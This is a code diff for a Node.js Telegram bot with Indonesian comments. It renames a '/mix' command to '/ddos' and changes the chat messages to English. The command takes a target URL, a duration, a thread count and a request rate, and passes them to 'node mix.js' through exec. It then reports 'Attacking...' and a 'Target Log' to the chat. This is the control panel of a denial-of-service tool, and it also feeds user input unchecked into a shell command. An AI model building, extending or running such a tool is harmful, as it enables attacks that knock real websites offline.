@@ -34,21 +34,20 @@ bot.on('message', (msg) => {
     return;
     }
   
-  if (command.startsWith('/mix')) {
+  if (command.startsWith('/ddos')) {
     // Mengekstrak argumen dari pesan
     const args = command.split(' ');
     const url = args[1];
     const time = args[2];
     const thread = args[3];
     const rate = args[4];
-
     // Memeriksa apakah format pesan benar
     if (args.length === 5 && url && time && thread && rate) {
-      // Menjalankan file mix.js dengan argumen yang diberikan
+      bot.sendMessage(chatId, `× Attacking... ×`);
       exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
         if (error) {
           console.error(`Error: ${error.message}`);
-          bot.sendMessage(chatId, `Target Locked..\n\nTarget Website : ${url}\nTime : ${time}sec\nThread : ${thread}\n Rate : ${rate}\nStatus : Successfull ✅`);
+          bot.sendMessage(chatId, `Target Log :\n\n• Target Website : ${url}\n• Time : ${time}sec\n• Thread : ${thread}\n• Rate : ${rate}\n• Status : Successfull 🤞`);
           return;
         }
         if (stderr) {
@@ -58,11 +57,11 @@ bot.on('message', (msg) => {
         }
         // Menampilkan output stdout jika berhasil
         console.log(`stdout: ${stdout}`);
-        bot.sendMessage(chatId, 'Proses telah dimulai.');
+        bot.sendMessage(chatId, 'Process Started !');
       });
     } else {
       // Memberi tahu pengguna bahwa format pesan tidak benar
-      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /mix [url] [time] [thread] [rate]');
+      bot.sendMessage(chatId, 'Please Follow The Format : /ddos [url] [time] [thread] [rate]');
     }
   }
 });
